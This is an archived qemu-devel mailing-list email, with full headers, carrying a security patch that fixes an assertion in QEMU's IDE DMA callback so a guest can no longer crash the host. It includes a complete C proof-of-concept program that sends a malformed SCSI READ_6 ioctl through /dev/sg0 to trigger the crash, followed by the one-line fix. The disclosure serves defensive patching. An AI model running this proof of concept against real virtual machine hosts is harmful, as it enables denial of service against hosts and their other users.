Return-Path: <SRS0=wUMn=VC=nongnu.org=qemu-devel-bounces+qemu-devel=archiver.kernel.org@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
X-Spam-Level: 
X-Spam-Status: No, score=-10.0 required=3.0
	tests=HEADER_FROM_DIFFERENT_DOMAINS,INCLUDES_PATCH,MAILING_LIST_MULTI,
	SIGNED_OFF_BY,SPF_HELO_NONE,SPF_PASS,USER_AGENT_GIT autolearn=ham
	autolearn_force=no version=3.4.0
Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
	by smtp.lore.kernel.org (Postfix) with ESMTP id 59505C4649B
	for <qemu-devel@archiver.kernel.org>; Fri,  5 Jul 2019 14:44:15 +0000 (UTC)
Received: from lists.gnu.org (lists.gnu.org [209.51.188.17])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by mail.kernel.org (Postfix) with ESMTPS id 35FA22147A
	for <qemu-devel@archiver.kernel.org>; Fri,  5 Jul 2019 14:44:15 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org 35FA22147A
Authentication-Results: mail.kernel.org; dmarc=none (p=none dis=none) header.from=linux.com
Authentication-Results: mail.kernel.org; spf=pass smtp.mailfrom=qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Received: from localhost ([::1]:53844 helo=lists1p.gnu.org)
	by lists.gnu.org with esmtp (Exim 4.86_2)
	(envelope-from <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>)
	id 1hjPRe-0006oi-7y
	for qemu-devel@archiver.kernel.org; Fri, 05 Jul 2019 10:44:14 -0400
Received: from eggs.gnu.org ([2001:470:142:3::10]:46200)
 by lists.gnu.org with esmtp (Exim 4.86_2)
 (envelope-from <a13xp0p0v88@gmail.com>) id 1hjOsr-0001A0-2R
 for qemu-devel@nongnu.org; Fri, 05 Jul 2019 10:08:19 -0400
Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
 (envelope-from <a13xp0p0v88@gmail.com>) id 1hjOso-0006X0-8M
 for qemu-devel@nongnu.org; Fri, 05 Jul 2019 10:08:15 -0400
Received: from mail-lf1-f66.google.com ([209.85.167.66]:41390)
 by eggs.gnu.org with esmtps (TLS1.0:RSA_AES_128_CBC_SHA1:16)
 (Exim 4.71) (envelope-from <a13xp0p0v88@gmail.com>)
 id 1hjOsi-0005Yo-DH; Fri, 05 Jul 2019 10:08:09 -0400
Received: by mail-lf1-f66.google.com with SMTP id 62so6422907lfa.8;
 Fri, 05 Jul 2019 07:08:01 -0700 (PDT)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=1e100.net; s=20161025;
 h=x-gm-message-state:from:to:subject:date:message-id;
 bh=isMJDTAnfZgWdLOw8d367N2Ss2BSvcqEi2CrNYGG5dM=;
 b=ozJRLeWD3b2wGRC5EUhCGJyBwOCe6oxkGPVPu7z0C1ZUtWLNzPZEDS8rKRuax+fYxu
 3TnGQgPWaCErTFzcVCgNfBpCNDCNOHtTBHUzyg2hH0ASKfHPz1MV/BO+0Uli9/RzTggS
 9um4j4Y7sCpPg5eXBdj4xGlM9y7eifKRfzG7l6DeRj4vkfQBaMNnYhOvctV2f9B6eA4C
 j8pK4+lLOxZ+xa1GhpjAXnbdLmjGW6UpHL1kVhYTDw0eHyk+LFZcuJuzlf37SywmGNZ6
 WUyPuuUJEy+KQa48sUwWMB/pGLyBIlHTv6fvIl2rVJV21ni3kexjzCOHyV7cX6ycM6gX
 1/ew==
X-Gm-Message-State: APjAAAVdlnj39vlc7yQUtWcCqzg5r0ULU/l95dhbW5PlS5AS2u1yqMVl
 6+UlV7ZHfXQna32ksFJ2pPM=
X-Google-Smtp-Source: APXvYqx4GrlhQWRxzNKozoRLB24nQhBogFgYgJc9OPAkM0JAAayatoCnuq8RrJGKT9H8j+CQbCop4A==
X-Received: by 2002:a19:ec15:: with SMTP id b21mr2311417lfa.32.1562335680324; 
 Fri, 05 Jul 2019 07:08:00 -0700 (PDT)
Received: from hobbit.lan (95-28-29-40.broadband.corbina.ru. [95.28.29.40])
 by smtp.gmail.com with ESMTPSA id p21sm1098298lfc.41.2019.07.05.07.07.58
 (version=TLS1_2 cipher=ECDHE-RSA-AES128-SHA bits=128/128);
 Fri, 05 Jul 2019 07:07:59 -0700 (PDT)
From: Alexander Popov <alex.popov@linux.com>
To: John Snow <jsnow@redhat.com>, qemu-block@nongnu.org, qemu-devel@nongnu.org,
 qemu-stable@nongnu.org, mst@redhat.com, pmatouse@redhat.com,
 sstabellini@kernel.org, mdroth@linux.vnet.ibm.com, pjp@redhat.com,
 alex.popov@linux.com
Date: Fri,  5 Jul 2019 17:07:49 +0300
Message-Id: <1562335669-10127-1-git-send-email-alex.popov@linux.com>
X-Mailer: git-send-email 2.7.4
X-detected-operating-system: by eggs.gnu.org: GNU/Linux 2.2.x-3.x [generic]
 [fuzzy]
X-Received-From: 209.85.167.66
X-Mailman-Approved-At: Fri, 05 Jul 2019 10:42:17 -0400
Subject: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to
 prevent qemu DoS from quest
X-BeenThere: qemu-devel@nongnu.org
X-Mailman-Version: 2.1.23
Precedence: list
List-Id: <qemu-devel.nongnu.org>
List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
List-Archive: <https://lists.nongnu.org/archive/html/qemu-devel>
List-Post: <mailto:qemu-devel@nongnu.org>
List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=subscribe>
Errors-To: qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Sender: "Qemu-devel"
 <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>

This assertion was introduced in the commit a718978ed58a in July 2015.
It implies that the size of successful DMA transfers handled in
ide_dma_cb() should be multiple of 512 (the size of a sector).

But guest systems can initiate DMA transfers that don't fit this
requirement. Let's improve the assertion to prevent qemu DoS from quests.

PoC for Linux that uses SCSI_IOCTL_SEND_COMMAND to perform such an ATA
command and crash qemu:

#include <stdio.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <scsi/scsi.h>
#include <scsi/scsi_ioctl.h>

#define CMD_SIZE 2048

struct scsi_ioctl_cmd_6 {
	unsigned int inlen;
	unsigned int outlen;
	unsigned char cmd[6];
	unsigned char data[];
};

int main(void)
{
	intptr_t fd = 0;
	struct scsi_ioctl_cmd_6 *cmd = NULL;

	cmd = malloc(CMD_SIZE);
	if (!cmd) {
		perror("[-] malloc");
		return 1;
	}

	memset(cmd, 0, CMD_SIZE);
	cmd->inlen = 1337;
	cmd->cmd[0] = READ_6;

	fd = open("/dev/sg0", O_RDONLY);
	if (fd == -1) {
		perror("[-] opening sg");
		return 1;
	}

	printf("[+] sg0 is opened\n");

	printf("[.] qemu should break here:\n");
	fflush(stdout);
	ioctl(fd, SCSI_IOCTL_SEND_COMMAND, cmd);
	printf("[-] qemu didn't break\n");

	free(cmd);

	return 1;
}

Signed-off-by: Alexander Popov <alex.popov@linux.com>
---
 hw/ide/core.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/hw/ide/core.c b/hw/ide/core.c
index 6afadf8..304fe69 100644
--- a/hw/ide/core.c
+++ b/hw/ide/core.c
@@ -868,7 +868,7 @@ static void ide_dma_cb(void *opaque, int ret)
 
     sector_num = ide_get_sector(s);
     if (n > 0) {
-        assert(n * 512 == s->sg.size);
+        assert(n == s->sg.size / 512);
         dma_buf_commit(s, s->sg.size);
         sector_num += n;
         ide_set_sector(s, sector_num);
-- 
2.7.4


